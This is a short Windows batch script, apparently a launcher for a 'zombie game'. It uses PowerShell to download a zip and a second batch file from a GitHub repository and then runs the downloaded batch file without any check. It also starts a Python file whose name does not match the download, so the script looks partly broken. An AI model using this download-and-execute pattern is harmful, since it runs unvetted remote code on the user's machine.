@echo off 
cls

powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/zombie_game.zip','C:\your\asylum\zombie_game.zip')"

start zombie_egame.py

timeout /t 20

powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/code-1.bat','C:\your\asylum\code-1.bat')"

start code-1.bat

pause
exit
